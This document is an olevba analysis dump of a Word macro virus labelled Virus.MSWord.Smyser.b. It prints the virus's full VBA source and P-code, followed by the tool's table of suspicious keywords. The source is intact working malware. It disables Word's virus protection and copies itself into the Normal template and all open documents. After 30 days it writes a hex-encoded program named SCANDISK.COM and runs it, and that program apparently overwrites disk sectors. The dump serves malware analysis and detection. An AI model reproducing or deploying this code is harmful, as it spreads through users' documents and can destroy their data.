olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Smyser.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Smyser.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'5/3/04
'30/04/2004
'20/04/2004
'2003/9/4
Private Sub Document_Open()
'Anti-Smyser'
'A.T.P Ver 1.2
    On Error Resume Next
    Application.Options.VirusProtection = False
    Dim CodeStr As String: CodeStr = "B9040051BB0002B80102B90100BA8000CD13597308B400CD13E2E8EB2BB90002BE00028A04F6D08804464975F6B9040051BB0002B80103B90100BA8000CD13597306B400CD13E2E831C0CD21"
    Dim i As Integer, b As Byte, f As Integer, fn As String, s As String, det As Date
    If Mid(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) <> Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) Or Val(Right(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) < Val(Right(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) Then NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then f = FreeFile: fn = Environ("TEMP") & "\~$WM" & Year(Date) & Month(Date) & Day(Date) & ".tmp": Open fn For Output As #f: Print #f, Chr(39) & Date: Print #f, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(2, ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines - 1): Close #f: NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromFile fn: Kill fn
    If NormalTemplate.Saved = False Then NormalTemplate.Save
    Dim Doc As Document, PreSaved As Boolean, Cloned As Boolean
    For Each Doc In Application.Documents
        PreSaved = Doc.Saved And (Doc.Path <> "") And Not Doc.ReadOnly: Cloned = False
        If Mid(Doc.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) <> Mid(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 2, 9) Or Val(Right(Doc.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) < Val(Right(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(4, 1), 4)) Then Doc.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Doc.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
        If Doc.VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then f = FreeFile: fn = Environ("TEMP") & "\~$WM" & Year(Date) & Month(Date) & Day(Date) & ".tmp": Open fn For Output As #f: Print #f, Chr(39) & Date: Print #f, ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(2, ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines - 1): Close #f: Doc.VBProject.VBComponents.Item(1).CodeModule.AddFromFile fn: Kill fn: Cloned = True
        If Cloned And PreSaved Then f = FreeFile: fn = Doc.Path & "\~$" & Doc.Name: Err.Clear: Open fn For Output As f: If Err.Number = 0 Then Close f: Kill fn: Doc.Save
    Next Doc
    s = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(1, 1): Mid(s, 1, 1) = " ": det = s: If Date > det + 30 Then fn = Environ("TEMP") & "\SCANDISK.COM": f = FreeFile: Open fn For Binary Access Write As f: For i = 1 To Len(CodeStr) Step 2: b = CByte("&H" & Mid(CodeStr, i, 2)): Put f, , b: Next i: Close f: Shell fn, 6: Date = det
End Sub
Private Sub Document_Close()
    Document_Open
End Sub
Private Sub Document_New()
    Document_Open
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Smyser.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5301 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0006 "5/3/04"
' Line #1:
' 	QuoteRem 0x0000 0x000A "30/04/2004"
' Line #2:
' 	QuoteRem 0x0000 0x000A "20/04/2004"
' Line #3:
' 	QuoteRem 0x0000 0x0008 "2003/9/4"
' Line #4:
' 	FuncDefn (Private Sub Document_Open())
' Line #5:
' 	QuoteRem 0x0000 0x000C "Anti-Smyser'"
' Line #6:
' 	QuoteRem 0x0000 0x000D "A.T.P Ver 1.2"
' Line #7:
' 	OnError (Resume Next) 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #9:
' 	Dim 
' 	VarDefn CodeStr (As String)
' 	BoS 0x0000 
' 	LitStr 0x0098 "B9040051BB0002B80102B90100BA8000CD13597308B400CD13E2E8EB2BB90002BE00028A04F6D08804464975F6B9040051BB0002B80103B90100BA8000CD13597306B400CD13E2E831C0CD21"
' 	St CodeStr 
' Line #10:
' 	Dim 
' 	VarDefn i (As Integer)
' 	VarDefn B (As Byte)
' 	VarDefn False (As Integer)
' 	VarDefn fn (As String)
' 	VarDefn s (As String)
' 	VarDefn det (As Date)
' Line #11:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd Mid$ 0x0003 
' 	Ne 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0004 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0004 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Friend 
' 	St False 
' 	BoS 0x0000 
' 	LitStr 0x0004 "TEMP"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0005 "\~$WM"
' 	Concat 
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	Concat 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	Concat 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".tmp"
' 	Concat 
' 	St fn 
' 	BoS 0x0000 
' 	Ld fn 
' 	Ld False 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld Date 
' 	Concat 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	Ld False 
' 	Sharp 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	Ld fn 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' 	BoS 0x0000 
' 	Ld fn 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #13:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #14:
' 	Dim 
' 	VarDefn Doc (As Document)
' 	VarDefn PreSaved (As Boolean)
' 	VarDefn Cloned (As Boolean)
' Line #15:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd Documents 
' 	ForEach 
' Line #16:
' 	Ld Doc 
' 	MemLd Saved 
' 	Ld Doc 
' 	MemLd Path 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Paren 
' 	And 
' 	Ld Doc 
' 	MemLd ReadOnly 
' 	Not 
' 	And 
' 	St PreSaved 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	St Cloned 
' Line #17:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0002 
' 	LitDI2 0x0009 
' 	ArgsLd Mid$ 0x0003 
' 	Ne 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0004 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0004 
' 	ArgsLd Right 0x0002 
' 	ArgsLd Val 0x0001 
' 	Lt 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #18:
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Friend 
' 	St False 
' 	BoS 0x0000 
' 	LitStr 0x0004 "TEMP"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x0005 "\~$WM"
' 	Concat 
' 	Ld Date 
' 	ArgsLd Year 0x0001 
' 	Concat 
' 	Ld Date 
' 	ArgsLd Month 0x0001 
' 	Concat 
' 	Ld Date 
' 	ArgsLd Day 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".tmp"
' 	Concat 
' 	St fn 
' 	BoS 0x0000 
' 	Ld fn 
' 	Ld False 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0027 
' 	ArgsLd Chr 0x0001 
' 	Ld Date 
' 	Concat 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	Ld False 
' 	Sharp 
' 	PrintChan 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	PrintItemNL 
' 	BoS 0x0000 
' 	Ld False 
' 	Sharp 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	Ld fn 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' 	BoS 0x0000 
' 	Ld fn 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St Cloned 
' 	EndIf 
' Line #19:
' 	Ld Cloned 
' 	Ld PreSaved 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld Friend 
' 	St False 
' 	BoS 0x0000 
' 	Ld Doc 
' 	MemLd Path 
' 	LitStr 0x0003 "\~$"
' 	Concat 
' 	Ld Doc 
' 	MemLd New 
' 	Concat 
' 	St fn 
' 	BoS 0x0000 
' 	Ld Err 
' 	ArgsMemCall Clear 0x0000 
' 	BoS 0x0000 
' 	Ld fn 
' 	Ld False 
' 	LitDefault 
' 	Open (For Output)
' 	BoS 0x0000 
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld False 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	Ld fn 
' 	ArgsCall Kill 0x0001 
' 	BoS 0x0000 
' 	Ld Doc 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #20:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	NextVar 
' Line #21:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St s 
' 	BoS 0x0000 
' 	LitStr 0x0001 " "
' 	Ld s 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Mid 
' 	BoS 0x0000 
' 	Ld s 
' 	St det 
' 	BoS 0x0000 
' 	Ld Date 
' 	Ld det 
' 	LitDI2 0x001E 
' 	Add 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "TEMP"
' 	ArgsLd Environ 0x0001 
' 	LitStr 0x000D "\SCANDISK.COM"
' 	Concat 
' 	St fn 
' 	BoS 0x0000 
' 	Ld Friend 
' 	St False 
' 	BoS 0x0000 
' 	Ld fn 
' 	Ld False 
' 	LitDefault 
' 	Open (For Binary Access Write)
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld CodeStr 
' 	FnLen 
' 	LitDI2 0x0002 
' 	ForStep 
' 	BoS 0x0000 
' 	LitStr 0x0002 "&H"
' 	Ld CodeStr 
' 	Ld i 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	Coerce (Byte) 
' 	St B 
' 	BoS 0x0000 
' 	Ld False 
' 	LitDefault 
' 	Ld B 
' 	PutRec 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld False 
' 	Close 0x0001 
' 	BoS 0x0000 
' 	Ld fn 
' 	LitDI2 0x0006 
' 	ArgsCall Shell 0x0002 
' 	BoS 0x0000 
' 	Ld det 
' 	St Date 
' 	EndIf 
' Line #22:
' 	EndSub 
' Line #23:
' 	FuncDefn (Private Sub Document_Close())
' Line #24:
' 	ArgsCall Document_Open 0x0000 
' Line #25:
' 	EndSub 
' Line #26:
' 	FuncDefn (Private Sub Document_New())
' Line #27:
' 	ArgsCall Document_Open 0x0000 
' Line #28:
' 	EndSub 
' Line #29:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

